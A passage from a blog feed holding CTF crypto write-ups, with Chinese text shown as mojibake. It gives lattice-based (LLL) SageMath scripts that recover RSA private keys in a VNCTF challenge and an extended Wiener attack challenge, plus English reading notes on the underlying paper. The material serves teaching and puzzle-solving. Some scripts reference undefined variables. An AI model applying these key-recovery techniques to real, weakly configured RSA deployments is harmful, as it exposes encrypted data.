class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>æŠ„äº†é‚£ä¹ˆä¹…çš„paperå±…ç„¶æ˜¯ç”¨æ ¼å­åšçš„! æ„Ÿè°¢d33b4t0å¸ˆå‚…æŒ‡ç‚¹æ‰å¼„å‡ºè¿™é¢˜</p><p>è¿™é¢˜ç»™å‡ºäº†ä¸€ä¸ª300-bitçš„$d$, å†æ ¹æ®è¿™ä¸ª$d$ç”Ÿæˆäº†ä¸¤å¥—å…¬é’¥$n_1,n_2,e_1,e_2$</p><p>å…³ç³»å¼ä¸º<br>$$<br>e_1 \cdot d = 1 + k_1(p_1+1)(q_1+1) \\<br>e_2 \cdot d = 1 + k_2(p_2+1)(q_2+1)<br>$$<br>è®°$p_1+q_1+1 = s_1, p_2+q_2+1 = s_2$, æŠŠå¼å­åŒ–ä¸€ä¸‹å°±æœ‰<br>$$<br>e_1 \cdot d - k_1n_1 = k_1s_1+1 \\<br>e_2 \cdot d - k_2n_2 = k_2s_2+1<br>$$<br>è‡ªå·±åšçš„æ—¶å€™åªç”¨çš„å…¶ä¸­çš„ä¸€ä¸ªå¼å­é€ äºŒç»´æ ¼å­, ç»“æœæ­»æ´»éƒ½è§„çº¦ä¸å‡ºæ¥(ä¹Ÿä¸çŸ¥é“ä¸ºå•¥, ä»¥åèƒ½é€ ä¸‰ç»´å°±è¯•è¯•é€ ä¸‰ç»´å§.</p><p>ç”¨è¿™ä¸¤ä¸ªå¼å­é€ å‡ºä¸€ä¸ªä¸‰ç»´æ ¼å­<br>$$<br>(d ,-k_1,-k_2) =<br>\begin{pmatrix}<br>\sqrt n_1&amp;e_1&amp;e_2 \\<br>0&amp;n_1&amp;0 \\<br>0&amp;0&amp;n_2<br>\end{pmatrix}<br>=(d\sqrt n_1,k_1s_1+1,k_2s_2+1)<br>$$<br>(è‡³äºä¸ºå•¥æœ‰ä¸ª$\sqrt n_1$, å½“ç„¶æ˜¯ä¸ºäº†è°ƒæ•´ä¸€ä¸‹èŒƒæ•°! å‘é‡çš„é•¿åº¦ä¹Ÿæ˜¯åˆé€‚çš„(å¾—é $d, k ,s$çš„ä½æ•°æ¥åˆ¤æ–­</p><p>é€šè¿‡è§„çº¦è¿™ä¸ªæ ¼å­, æœ‰äº†$(d\sqrt n_1,k_1s_1+1,k_2s_2+1)$, å°±èƒ½å¾—å‡º$d$</p><p>å‰©ä¸‹çš„å°±æ˜¯å·²çŸ¥$e,d,n$æ±‚$phi$äº†, ä¸è¿‡è¿™é‡Œçš„$d$æœ‰ç‚¹ä¸å¤ªä¸€æ ·æ³¨æ„ä¸€ä¸‹å°±okäº†</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes <span class="keyword">as</span> l2b ,isPrime</span><br><span class="line">n1 = <span class="number">115483338707853323510117244601663937653032657454816581880428779391136584508645415322441921678179684904267659942318581245589538093236558206867210468172871004098796706517288570963560499418427771831765342801956281881820593084352360716457591198748797415842971188690055630073433785996545367137242661591939632740177</span></span><br><span class="line">n2 = <span class="number">53622548101803784449246949981043962044702821559359430270342163843702543781580388956841660273746825211912789196955019345268896290156568895362182295889379787233440464948232717888315385094207004043907898658611926470834448875571292174245716821120409044389816082878077188546182422805778560826667364235348059795229</span></span><br><span class="line">e1 = <span class="number">57942961120648999071495995119939754708884253716257622598699627649519120883383654560602196191747110519111036450217116739928381611061803307053632035548944075112790103258912149703053932492832060534126356062378027983000713091223894604748395826345780826674822582205573649323340945351657354960324397873669889767611</span></span><br><span class="line">e2 = <span class="number">37629174280947918845570975617525141920002123382327456934545962737176558640617579710289304146119507880547361939594011152968663070025066085778798378563965349218834887746411017240322083056673687330052590220772859205859051875687741541958997904176801239206348298021023694604932588913541173039972303193792987583003</span></span><br><span class="line">half_n = <span class="built_in">round</span>(sqrt(n))</span><br><span class="line"></span><br><span class="line">L = Matrix([[half_n     ,e1  ,e2],</span><br><span class="line">            [<span class="number">0</span>       ,n1  ,<span class="number">0</span>],</span><br><span class="line">            [<span class="number">0</span>       ,<span class="number">0</span>   ,n2]])</span><br><span class="line">res = L.LLL()[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">abs</span>(res[<span class="number">0</span>]) % half_n == <span class="number">0</span></span><br><span class="line">d = <span class="built_in">abs</span>(res[<span class="number">0</span>]) // half_n</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isPrime(d) :</span><br><span class="line">    knophi = e1 *d - <span class="number">1</span></span><br><span class="line">    nophi = knophi // (knophi // n1 )</span><br><span class="line">    pq = nophi - n - <span class="number">1</span></span><br><span class="line">    phi = n -pq +<span class="number">1</span></span><br><span class="line">    d1 = inverse_mod(e1,phi)</span><br><span class="line">    print(l2b(<span class="built_in">pow</span>(cs[<span class="number">0</span>],d1,n1)))</span><br><span class="line"><span class="comment"># b&#x27;vnctf&#123;7d47956b-bc55-4897-a550-cda0b221ce67&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>è¿™é¢˜åšå®Œæ„Ÿè§‰æ”¶è·è¿˜æ˜¯æœ‰çš„, ä¸åƒå‰é¢çš„å‡ é¢˜</p><p>Latticeæ˜¯ä¸€ä¸ªç¥å¥‡çš„ä¸œè¥¿, ä¸€å®šè¦æŠŠæ‰€æœ‰æ–¹ç¨‹å†™å‡ºæ¥, è¯¥è”ç«‹çš„è”ç«‹, æ ¹æ®æœªçŸ¥é‡å’Œå·²çŸ¥é‡ä»¥åŠè¿™äº›æ•°çš„ä½æ•°,<br>é€ å‡ºåˆé€‚çš„Latticeæ‰èƒ½æ±‚å‡ºå‡ºé¢˜äººæƒ³è¦æˆ‘ä»¬è§„çº¦å‡ºçš„é‚£ä¸ªæœ€çŸ­å‘é‡æ¥</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™æ¬¡æ¯”èµ›å¬è¯´æ˜¯ç­¾åˆ°éš¾åº¦, å°±åšäº†ä¸€ä¸‹, ç»“æœä¹Ÿæ²¡èƒ½ak (è¯´ç®€å•éƒ½æ˜¯éª—äººçš„â€¦)&lt;br&gt;å—¯â€¦ ä¼šåšçš„é¢˜ä¹Ÿæ²¡ä»€ä¹ˆæ”¶è·, ç¡¬è¦è¯´çš„è¯, whitegiveçš„ç¬¬ä¸€å±‚éœ€è¦é€šè¿‡è¿ç®—æŠŠå·²çŸ¥çš„æ¡ä»¶åˆåœ¨ä¸€èµ·æˆ–è€…æ¶ˆå»ä¸€äº›ä¸å¯èƒ½æ±‚å‡ºçš„å‚æ•°, è¿™ä¸ªä¸€ç›´éƒ½æ˜¯å¯†ç åˆ†æçš„åŸºç¡€å§, æ¥çœ‹çœ‹é¢˜å§&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="RSA" scheme="http://tearsjin.github.io/tags/RSA/"/>
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>2020çºµæ¨ªæ¯ comon-Extending Wiener attack</title>
    <link href="http://tearsjin.github.io/2021/03/12/2020%E7%BA%B5%E6%A8%AA%E6%9D%AF-comon-Extending-Wiener-attack/"/>
    <id>http://tearsjin.github.io/2021/03/12/2020%E7%BA%B5%E6%A8%AA%E6%9D%AF-comon-Extending-Wiener-attack/</id>
    <published>2021-03-12T11:33:50.000Z</published>
    <updated>2021-03-13T11:46:51.187Z</updated>
    
    <content type="html"><![CDATA[<h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e1 =  <span class="number">28720970875923431651096339432854172528258265954461865674640550905460254396153781189674547341687577425387833579798322688436040388359600753225864838008717449960738481507237546818409576080342018413998438508242156786918906491731633276138883100372823397583184685654971806498370497526719232024164841910708290088581</span></span><br><span class="line">e2 =  <span class="number">131021266002802786854388653080729140273443902141665778170604465113620346076511262124829371838724811039714548987535108721308165699613894661841484523537507024099679248417817366537529114819815251239300463529072042548335699747397368129995809673969216724195536938971493436488732311727298655252602350061303755611563</span></span><br><span class="line">N =  <span class="number">159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781117564072817251103154968492955749973403646311198170703330345340987100788144707482536112028286039187104750378366564167383729662815980782817121382587188922253</span></span><br><span class="line">flag = <span class="string">b&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;</span></span><br><span class="line">f1 = bytes_to_long(flag[:<span class="number">21</span>])</span><br><span class="line">f2 = bytes_to_long(flag[<span class="number">21</span>:])</span><br><span class="line">c1 = <span class="built_in">pow</span>(f1, e1, N)</span><br><span class="line">c2 = <span class="built_in">pow</span>(f2, e2, N)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;e1 = &quot;</span>, e1)</span><br><span class="line">print(<span class="string">&quot;e2 = &quot;</span>, e2)</span><br><span class="line">print(<span class="string">&quot;N = &quot;</span>, N)</span><br><span class="line">print(<span class="string">&quot;c1 = &quot;</span>, c1)</span><br><span class="line">print(<span class="string">&quot;c2 = &quot;</span>, c2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>è¿™ä¸ªé¢˜ä¸€çœ‹è¿˜ä»¥ä¸ºæ˜¯ç®€å•çš„Common Attack, åªæœ‰åŒä¸€ä¸ªæ˜æ–‡, ä¸åŒçš„$e$æ‰èƒ½ç”¨Common Attack è¿™é‡Œæ˜¾ç„¶ä¸¤ä¸ªå¯†æ–‡å¯¹åº”çš„ä¸æ˜¯åŒä¸€ä¸ªæ˜æ–‡â€¦<br>è¿™ç§é¢˜ä¼°è®¡éƒ½æœ‰ä»€ä¹ˆæ”»å‡»æ–¹æ³•, åæ¥æ‰¾wpçœ‹äº†, æœç„¶æ˜¯æœ‰ä¸€ç§æ”»å‡»æ–¹æ³•çš„, æŠŠpaper(Extending Wienerâ€™s Attack in the Presence of Many Decrypting Exponents)è¯¦ç»†çš„å­¦äº†ä¸€é, æ‰æ˜ç™½å…·ä½“è¯¥æ€ä¹ˆè§£,</p><p>è¿™ä¸ªæ”»å‡»æ–¹æ³•é€‚ç”¨äº$e$ç‰¹åˆ«å¤§, å¹¶ä¸”æœ‰å¤šä¸ª$e$çš„æ—¶å€™(æ˜¾ç„¶$e$è¿˜æœ‰å¤§åˆ°å¯ä»¥ç›´æ¥winner)<br>å¤§æ¦‚æ€è·¯æ˜¯é€ ä¸€ä¸ªæ ¼å­æ±‚å‡ºå‚æ•°è®©é—®é¢˜è½¬å˜æˆwinnerè¦è§£å†³çš„é—®é¢˜(è¿åˆ†æ•°çš„åˆ†è§£), ä½†æ˜¯è¿™é‡Œ$g$æ˜¯ä¸º1çš„æ‰€ä»¥ä¸éœ€è¦è¿åˆ†æ•°å¯ä»¥ç›´æ¥æ±‚å‡ºphi</p><p>æ„é€ æ ¼å­çš„æ–¹æ³•paperé‡Œæœ‰, é˜…è¯»ç¬”è®°é‡Œä¹Ÿæœ‰è¿™é‡Œå°±ä¸å¤šè¯´, ç›´æ¥é€ !<br>$$<br>L_2 =<br>\begin{pmatrix}<br>N&amp;-M_1N&amp;0&amp;N^2 \\<br>0&amp;M_1e_1&amp;-M_2e_1&amp;-e_1N \\<br>0&amp;0&amp;M_2e_2&amp;-e_2N \\<br>0&amp;0&amp;0&amp;e_1e_2<br>\end{pmatrix}<br>$$<br>è¿™é‡Œ$M_1 = N^{1 \over 2},M_2 = N^{1+\alpha_2},\alpha_2 = {5 \over 14 } - \epsilonâ€™$<br>LLL()è§„çº¦å‡ºåŸº$b =(b_1,b_2,b_3,b_4)$åæ±‚phiå³å¯</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">e1 =  <span class="number">28720970875923431651096339432854172528258265954461865674640550905460254396153781189674547341687577425387833579798322688436040388359600753225864838008717449960738481507237546818409576080342018413998438508242156786918906491731633276138883100372823397583184685654971806498370497526719232024164841910708290088581</span></span><br><span class="line">e2 =  <span class="number">131021266002802786854388653080729140273443902141665778170604465113620346076511262124829371838724811039714548987535108721308165699613894661841484523537507024099679248417817366537529114819815251239300463529072042548335699747397368129995809673969216724195536938971493436488732311727298655252602350061303755611563</span></span><br><span class="line">N =  <span class="number">159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781117564072817251103154968492955749973403646311198170703330345340987100788144707482536112028286039187104750378366564167383729662815980782817121382587188922253</span></span><br><span class="line">c1 =  <span class="number">89410578059910615243542114610890994179298819076294899300341196922537672226283347286177838507350481980653301675042566354947161446918391494634173771489921535378415952543761341962187827617956463740415683816828323475428328607025791449389552492799278886876413138326117622825124519567340298133646090783889193450681</span></span><br><span class="line">c2 =  <span class="number">106022564245731443282859231814772725680579944691962958987527668508496192529331599682371642691880849071915084510118117099828154554231286326729922119326305261125960484865171940233343041874124811917291652357776045940511178855947892557181650249473057939642726565131933445072147505756108121271288834439942107732015</span></span><br><span class="line"><span class="keyword">for</span> epsilon <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    M1 = <span class="built_in">int</span>(N^(<span class="number">0.5</span>))</span><br><span class="line">    M2 = <span class="built_in">int</span>(N^(<span class="number">1</span>+<span class="number">5</span>/<span class="number">14</span> - (epsilon*<span class="number">0.01</span>)))</span><br><span class="line">    <span class="comment">#epsilonæ˜¯æ²¡åŠæ³•ç¡®å®šçš„, å°å°çš„çˆ†ç ´ä¸€ä¸‹</span></span><br><span class="line">    v1 = vector([N,-M1*N,<span class="number">0</span>,N^<span class="number">2</span>])</span><br><span class="line">    v2 = vector([<span class="number">0</span>,M1*e1,-M2*e1,-e1*N])</span><br><span class="line">    v3 = vector([<span class="number">0</span>,<span class="number">0</span>,M2*e2,-e2*N])</span><br><span class="line">    v4 = vector([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,e1*e2])</span><br><span class="line"></span><br><span class="line">    L = Matrix([v1,v2,v3,v4])</span><br><span class="line">    B = L.LLL()[<span class="number">0</span>]</span><br><span class="line">    B = L.solve_left(B)</span><br><span class="line"></span><br><span class="line">    phi = floor(e1 * B[<span class="number">1</span>]//B[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># è¿™è¾¹phiä¼šå‰åå·®1æˆ–è€…å·®2</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>,<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            d1 = inverse_mod(e1,phi+j)</span><br><span class="line">            d2 = inverse_mod(e2,phi+j)</span><br><span class="line">            flag = long_to_bytes(<span class="built_in">pow</span>(c1,d1,N)) + long_to_bytes(<span class="built_in">pow</span>(c2,d2,N))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;&#123;&#x27;</span> <span class="keyword">in</span> flag <span class="keyword">and</span> <span class="string">b&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                print(i,flag)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>çœ‹å®Œäº†ç†è®ºè‡ªå·±ä»£ç å®ç°çš„æ—¶å€™è¿˜æ˜¯ä¼šæœ‰ä¸å°‘é—®é¢˜çš„..</p><p>è¿™é‡Œæœ‰ä¸€ä¸ª<code>Matrix.solve_left</code>å’Œ<code>Matrix.solve_right</code>çš„åŒºåˆ«, ä¹Ÿæ²¡æ€ä¹ˆææ‡‚, ä¸»è¦æ˜¯ä¸çŸ¥é“è¿™ä¸¤ä¸ªåˆ°åº•ä»€ä¹ˆæ—¶å€™ç”¨ä»€ä¹ˆ, åªèƒ½å…ˆæ¯æ¬¡éƒ½è¯•è¯•è¿™ä¸¤ä¸ªäº†.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;problem&quot;&gt;&lt;a href=&quot;#problem&quot; class=&quot;headerlink&quot; title=&quot;problem&quot;&gt;&lt;/a&gt;problem&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class</summary>
      
    
    
    
    <category term="CryptoSummary" scheme="http://tearsjin.github.io/categories/CryptoSummary/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="RSA" scheme="http://tearsjin.github.io/tags/RSA/"/>
    
    <category term="Extending Wiener Attack" scheme="http://tearsjin.github.io/tags/Extending-Wiener-Attack/"/>
    
    <category term="Lattice" scheme="http://tearsjin.github.io/tags/Lattice/"/>
    
  </entry>
  
  <entry>
    <title>Reading notes Extending Wiener&#39;s Attack in the Presence of Many Decrypting Exponents</title>
    <link href="http://tearsjin.github.io/2021/03/12/Reading-notes-Extending-Wiener-s-Attack-in-the-Presence-of-Many-Decrypting-Exponents/"/>
    <id>http://tearsjin.github.io/2021/03/12/Reading-notes-Extending-Wiener-s-Attack-in-the-Presence-of-Many-Decrypting-Exponents/</id>
    <published>2021-03-12T04:54:13.000Z</published>
    <updated>2021-03-13T11:06:25.690Z</updated>
    
    <content type="html"><![CDATA[<h2 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h2><p>the purpose of this paper is given only several public exponents for a given modulus and the know-ledge of the corresponding private being quiet small.</p><h2 id="Low-Private-Exponent-Attacks-on-RSA"><a href="#Low-Private-Exponent-Attacks-on-RSA" class="headerlink" title="Low Private Exponent Attacks on RSA"></a>Low Private Exponent Attacks on RSA</h2><h3 id="Wienerâ€™s-Approach"><a href="#Wienerâ€™s-Approach" class="headerlink" title="Wienerâ€™s Approach"></a>Wienerâ€™s Approach</h3><p>The Wienerâ€™s Attack in this paper not the same as I had learnt before.<br>$$<br>e \cdot d  - k \lambda(N) = 1 \<br>$$</p><p>Let $ \lambda(N) = {(p-1)(q-1) \over g} , s = 1 - p - q$ then we have<br>$$<br>e \cdot d - {k(p-1)(q-1) \over g} \<br>= e \cdot d - {k(N+s) \over g} = 1 \<br>$$</p><p>$$<br>egd - kN = g + ks \tag{1}<br>$$</p><p>Dividing both side of equation (1) by $dgN$<br>$$<br>{e \over N} - {k \over dg} = {g + ks \over dgN} = ({k \over dg})({s\over N})+{1 \over dN}<br>$$<br>Because $e \approx N$ and $s \approx N^{1 \over 2}$, we have ${k \over dg} \approx 1$, hence $({k \over dg})({s\over N})+{1 \over dN} \approx N^{-{1 \over 2}}$</p><p>Then we need to quote an important conclusion:</p><p>if<br>$$<br>|x - {a \over b }| &lt; {1 \over 2b^2}<br>$$<br>then ${a\over b} $ is a continued fraction approximant of $ x$</p><p>so if<br>$$<br>N^{-{1 \over 2}}&lt;{1 \over 2(dg)^2}\<br>$$<br>then ${k \over dg}$ will be a continued fraction approximant of $ {e \over N}$</p><p>Condition can convert to gm<br>$$<br>d &lt; {2^{-{1\over 2}}N^{1\over4} \over g} \tag{2}<br>$$<br>and g will be small under the assumption that $\lambda(N) \approx N$(but  $g \ge 2 $ since p,q is odd)<br>when we get $dg$ , we can factor N so that break the RSA cryptosystem.</p><h3 id="Guoâ€™s-Approach"><a href="#Guoâ€™s-Approach" class="headerlink" title="Guoâ€™s Approach"></a>Guoâ€™s Approach</h3><p>This approach assumes that one has more than one $e_i$ for a given N, and each of these $e_i$ has a relatively small $d_i$.</p><p>For 2 encryption exponents, we have following relations:<br>$$<br>e_1d_1g - k_1(p-1)(q-1) = g \<br>e_2d_2g - k_2(p-1)(q-1) = g<br>$$<br>Multiplying the first by $k_2$ and the second by $k_1$, and Subtraction of two formulas gives<br>$$<br>k_2d_1e_1 - k_1d_2e_2 = k_2 - k_1 \tag{3}<br>$$<br>Dividing both sides of equation 3 by $k_2d_1e_2$<br>$$<br>{e_1 \over e_2} - {k_1d_2 \over k_2d_1} = {k_2 - k_1 \over k_2d_1e_2}<br>$$<br>and assuming that the $d_i$ are at most $N^{\alpha}$ , so the right-hand side is about $N^{-(1 + \alpha)}$<br>if we want the fraction $k_1d_2 \over k_2d_1$ could be a continued fraction approximant of $e_1 \over e_2$, we must have<br>$$<br>2(k_2d_1)^2 &lt; N^{1 + \alpha}<br>$$<br>and with the assumption that $k_2$ and $d_1$ are at most $N^{\alpha}$ and the g is small this condition will be true where $\alpha  = {1 \over 3} - \epsilon $ with $\epsilon &gt; 0$</p><p>But known the $k_2d_1$ and $k_1d_2$ can not break the RSA cryptosystem for two reason.<br>The solution is omitted here â€¦.</p><h3 id="Overview-of-our-Extension-Approach"><a href="#Overview-of-our-Extension-Approach" class="headerlink" title="Overview of our Extension Approach"></a>Overview of our Extension Approach</h3><p>This approach also assumes that we have more than one $e_i$ and each of these $e_i$ has a relatively small $d_i$ and the bounds of $d_i \ (i = 1,2,\cdots,n)$ is:</p><p>The $d$ can  as large as $N^{\alpha} $ where<br>$$<br>{(2n+1)2^n - (2n+1) { n \choose n/2 }<br>\over<br>(2n-2)2^n + (4n+2) { n \choose n/2 }}<br> \quad if\ n\ is\ even<br> \\<br> {(2n+1)2^n - 4n {n-1\choose (n-1)/2 }<br> \over<br> (2n-2)2^n + 8n {n-1\choose (n-1)/2}}<br>\quad if\ n\ is\ odd,<br>$$<br>For some reason , the attack is only practical for small $n$(the number of $e$, not the modulus $N$).</p><h2 id="An-Extension-in-the-Presence-of-Many-Small-Decryption-Exponents"><a href="#An-Extension-in-the-Presence-of-Many-Small-Decryption-Exponents" class="headerlink" title="An Extension in the Presence of Many Small Decryption Exponents"></a>An Extension in the Presence of Many Small Decryption Exponents</h2><h3 id="Preliminaries"><a href="#Preliminaries" class="headerlink" title="Preliminaries"></a>Preliminaries</h3><p>Let us refer to the relations of the form<br>$$<br>W_i = d_ige_i - k_iN =g+ k_is \<br>G_{i,j} = k_id_je_j - k_jd_ie_i = k_i - k_j<br>$$<br>we shall also assume, for a given $n$, that the $d_i$ and $k_i$ are at most $N^{\alpha_{n}}$, the $g$ is very small, the $s$ is about $N^{1 \over 2}$</p><h2 id="RSA-in-the-presence-of-2-Small-Decryption-Exponents"><a href="#RSA-in-the-presence-of-2-Small-Decryption-Exponents" class="headerlink" title="RSA in the presence of 2 Small Decryption Exponents"></a>RSA in the presence of 2 Small Decryption Exponents</h2><p>If we have two small decryption exponents,then the following relations hold:$W_1, G_{1,2},W_1W_2,$ or more explicitly:  (è¿™éƒ¨åˆ†è‹±æ–‡æ²¡çœ‹æ‡‚, æŠŠåŸå¥æŠ„ä¸‹æ¥äº†)<br>$$<br>d_1ge_1 - k_1N =g +k_1s, \\<br>k_1d_2e_2 - k_2d_1e_1 = k_1 - k_2,\\<br>d_1d_2g^{2}e_1e_2 - d_1gk_2e_1N - d_2gk_1e_2N + k_1k_2N^2 = (g + k_1s)(g+ k_2s)<br>$$<br>Multiplying the first by $k_2$ , we may write these equations in the matrix form below.<br>$$<br>(k_1k_2,d_1gk_2,d_2gk_1,d_1d_2g^2)\begin{pmatrix}1&amp;-N&amp;0&amp;N^2 \\ 0&amp;e_1&amp;-e_1&amp;-e_1N \\  0&amp;0&amp;e_2&amp;-e_2N \\  0&amp;0&amp;0&amp;e_1e_2\end{pmatrix} \\  =(k_1k_2,k_2(g+k_1s),k_1-k_2,(g+k_1s)(g+k_2s))<br>$$<br>The sizes of the entries of the vectors on the right-hand side are at most $N^{2\alpha_2} , N^{2\alpha_2 + {1 \over 2}}, N^{\alpha_2},N^{1+2\alpha_2} $respectively</p><p>Multiplying the first three columns of the matrix by $N,M_1=N^{1\over2},M_2=N^{1+\alpha_2}$ respectively, which gives following matrix:<br>$$<br>L_2=\begin{pmatrix}N&amp;-M_1N&amp;0&amp;N^2\\0&amp;M_1e_1&amp;-M_2e_1&amp;-e_1N\\0&amp;0&amp;M_2e_2&amp;-e_2N\\0&amp;0&amp;0&amp;e_1e_2\end{pmatrix}<br>$$<br>In this case the vector $b=(k_1k_2,d_1gk_2,d_2gk_1,d_1d_2g^2)$ will be such that<br>$$<br>||bL_2|| &lt; 2N^{1+2\alpha_2}.<br>$$<br>if the Lattice $L_2$ is pretty â€œrandomâ€ , there are almost no lattice points of $L_2$ shorter than the Minkowski bounds $2\Delta^{1\over 4}$. Under this assumptions, then $bL_2$ is the shortest point in $L_2$, if<br>$$<br>2N^{1+2\alpha_2}&lt;({1\over{c_2}})(N^{ {13\over2}+\alpha_2})^{1\over4}<br>$$<br> for some small $c_2$, which is true if<br>$$<br>\alpha_2&lt;{5\over 14}-\epsilon<br>$$</p><p>So, if$\alpha_2&lt;{5\over14}-\epsilon$, the vector $b = (b_1,b_2,b_3,b_4)$ can be found via Lattice basis reduction algorithms(e.g. LLL), so that we can calculate ${d_1g \over k_1} = {b2 \over b1}$. Then we can factor N via wienerâ€™s approach.</p><h3 id="RSA-in-the-presence-of-3-Small-Decryption-Exponents"><a href="#RSA-in-the-presence-of-3-Small-Decryption-Exponents" class="headerlink" title="RSA in the presence of 3 Small Decryption Exponents"></a>RSA in the presence of 3 Small Decryption Exponents</h3><p>Just like the last section(RSA in the presence of 2 Small Decryption Exponents), the Lattice is:<br>$$<br>L_3 =<br>\begin{pmatrix}<br>1&amp;-N&amp;0&amp;-N^2&amp;0&amp;0&amp;0&amp;-N^3\\<br>0&amp;e_1&amp;-e_1&amp;-e_1N&amp;-e_1&amp;0&amp;e_1N&amp;e_1N^{2}\\<br>0&amp;0&amp;e_2&amp;-e_2N&amp;0&amp;e_2N&amp;0&amp;e_2N^2\\<br>0&amp;0&amp;0&amp;e_1e_2&amp;0&amp;-e_1e_2&amp;-e_1e_2&amp;-e_1e_2N\\<br>0&amp;0&amp;0&amp;0&amp;e_3&amp;-e_3N&amp;-e_3N&amp;e_3N^2\\<br>0&amp;0&amp;0&amp;0&amp;0&amp;e_1e_3&amp;0&amp;-e_1e_3N\\<br>0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;e_2e_3&amp;e_2e_3N\\<br>0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;0&amp;e_1e_2e_3\\<br>\end{pmatrix}<br>\cdot D<br>$$<br>where $D$ is:<br>$$<br>diag(N^{3 \over2},N,N^{({3\over 2})+\alpha_3},N^{1\over2},N^{({3\over2})+\alpha_3},N^{1+\alpha_3},N^{1+\alpha_3},1)<br>$$</p><h3 id="RSA-in-the-presence-of-4-Small-Decryption-Exponents"><a href="#RSA-in-the-presence-of-4-Small-Decryption-Exponents" class="headerlink" title="RSA in the presence of 4 Small Decryption Exponents"></a>RSA in the presence of 4 Small Decryption Exponents</h3><p>The matrix is too bigâ€¦..</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#introduction&quot; class=&quot;headerlink&quot; title=&quot;introduction&quot;&gt;&lt;/a&gt;introduction&lt;/h2&gt;&lt;p&gt;the purpose of this paper is g</summary>
      
    
    
    
    <category term="Reading notes" scheme="http://tearsjin.github.io/categories/Reading-notes/"/>
    
    
    <category term="RSA" scheme="http://tearsjin.github.io/tags/RSA/"/>
    
    <category term="Reading" scheme="http://tearsjin.github.io/tags/Reading/"/>
    
  </entry>
  
  <entry>
    <title>writeup for 2021AntCTFxD^3CTF Crypto</title>
